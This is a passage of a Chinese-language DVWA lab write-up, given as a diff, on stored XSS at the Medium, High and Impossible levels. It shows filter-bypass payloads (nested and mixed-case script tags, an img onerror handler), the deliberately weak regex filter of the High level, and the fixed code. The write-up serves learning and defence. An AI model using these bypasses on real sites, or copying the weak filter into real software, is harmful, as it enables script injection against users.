+	直接修改前端代码改 name 参数为 `<sc<script>ript>alert(/xss/)</script>` ,成功弹框
+
+2. 大小写混淆绕过
+
+	直接修改前端代码改 name 参数为 `<Script>alert(/xss/)</script>` ,成功弹框
+
+#### High
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'btnSign' ] ) ) {
+    // Get input
+    $message = trim( $_POST[ 'mtxMessage' ] );
+    $name    = trim( $_POST[ 'txtName' ] );
+
+    // Sanitize message input
+    $message = strip_tags( addslashes( $message ) );
+    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $name );
+    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+
+    // Update database
+    $query  = "INSERT INTO guestbook ( comment, name ) VALUES ( '$message', '$name' );";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+    //mysql_close();
+}
+
+?>
+```
+
+可以看到，这里使用正则表达式过滤了 `<script>` 标签，但是却忽略了 img、iframe 等其它危险的标签，因此 name 参数依旧存在存储型 XSS。
+
+**漏洞利用**
+
+直接修改前端代码改 name 参数为 `<img src=1 onerror=alert(/xss/)>` ,成功弹框
+
+#### Impossible
+**服务器端核心代码**
+```php
+<?php
+
+if( isset( $_POST[ 'btnSign' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $message = trim( $_POST[ 'mtxMessage' ] );
+    $name    = trim( $_POST[ 'txtName' ] );
+
+    // Sanitize message input
+    $message = stripslashes( $message );
+    $message = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $message ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $message = htmlspecialchars( $message );
+
+    // Sanitize name input
+    $name = stripslashes( $name );
+    $name = ((isset($GLOBALS["___mysqli_ston"]) && is_object($GLOBALS["___mysqli_ston"])) ? mysqli_real_escape_string($GLOBALS["___mysqli_ston"],  $name ) : ((trigger_error("[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.", E_USER_ERROR)) ? "" : ""));
+    $name = htmlspecialchars( $name );
+
+    // Update database
+    $data = $db->prepare( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' );
+    $data->bindParam( ':message', $message, PDO::PARAM_STR );
+    $data->bindParam( ':name', $name, PDO::PARAM_STR );
+    $data->execute();
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+
+可以看到，通过使用 htmlspecialchars 函数，解决了 XSS，但是要注意的是，如果 htmlspecialchars 函数使用不当，攻击者就可以通过编码的方式绕过函数进行 XSS 注入，尤其是 DOM 型的 XSS。
 
 
 
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
+https://www.freebuf.com/articles/web/123779.html
 
 
 ---
